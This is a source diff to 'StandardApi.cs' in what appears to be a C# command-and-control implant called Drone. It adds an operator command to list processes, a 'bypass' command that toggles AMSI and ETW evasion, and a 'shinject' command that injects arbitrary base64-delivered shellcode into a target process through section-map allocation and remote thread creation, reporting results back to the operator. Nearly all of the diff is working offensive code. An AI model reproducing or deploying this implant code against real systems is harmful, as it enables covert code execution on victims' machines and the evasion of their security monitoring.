+++ DroneModules/StandardModule/StandardApi.cs
@@ -1,11 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 
 using Drone.DInvoke.DynamicInvoke;
+using Drone.DInvoke.Injection;
 using Drone.DInvoke.ManualMap;
 using Drone.Models;
 using Drone.Modules;
@@ -29,6 +31,7 @@ namespace Drone
             {
                 new("path")
             }),
+            new("ps", "List running processes", GetProcessListing),
             new ("getuid", "Get current identity", GetCurrentIdentity),
             new ("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
             {
@@ -48,7 +51,17 @@ namespace Drone
                 new("/path/to/file.dll", false, true),
                 new("export-name", false),
                 new("args")
-            })
+            }),
+            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
+            {
+                new("amsi/etw", false),
+                new("true/false")
+            }),
+            new("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject, new List<Command.Argument>
+            {
+                new("/path/to/shellcode.bin", false, true),
+                new("pid", false)
+            }),
         };
 
         private void GetCurrentDirectory(DroneTask task, CancellationToken token)
@@ -75,6 +88,12 @@ namespace Drone
 
             var result = Host.GetDirectoryListing(directory);
             
+            Drone.SendResult(task.TaskGuid, result.ToString());
+        }
+        
+        private void GetProcessListing(DroneTask task, CancellationToken token)
+        {
+            var result = Host.GetProcessListing();
             Drone.SendResult(task.TaskGuid, result.ToString());
         }
 
@@ -139,6 +158,65 @@ namespace Drone
                 funcParams);
 
             Drone.SendResult(task.TaskGuid, result);
+        }
+        
+        private void SetBypass(DroneTask task, CancellationToken token)
+        {
+            var config = "";
+
+            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
+                config = "BypassAmsi";
+
+            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
+                config = "BypassEtw";
+
+            if (string.IsNullOrEmpty(config))
+            {
+                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
+                return;
+            }
+
+            var current = Config.GetConfig<bool>(config);
+
+            if (task.Arguments.Length == 2)
+            {
+                if (!bool.TryParse(task.Arguments[1], out var enabled))
+                {
+                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
+                    return;
+                }
+
+                Config.SetConfig(config, enabled);
+                current = Config.GetConfig<bool>(config);
+            }
+
+            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
+        }
+        
+        private void ShellcodeInject(DroneTask task, CancellationToken token)
+        {
+            if (!int.TryParse(task.Arguments[0], out var pid))
+            {
+                Drone.SendError(task.TaskGuid, "Not a valid PID");
+                return;
+            }
+
+            var process = Process.GetProcessById(pid);
+
+            var shellcode = Convert.FromBase64String(task.Artefact);
+            var payload = new PICPayload(shellcode);
+            var alloc = new SectionMapAlloc();
+            var exec = new RemoteThreadCreate();
+
+            var success = Injector.Inject(payload, alloc, exec, process);
+
+            if (success)
+            {
+                Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {process.ProcessName}");
+                return;
+            }
+            
+            Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
         }
         
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]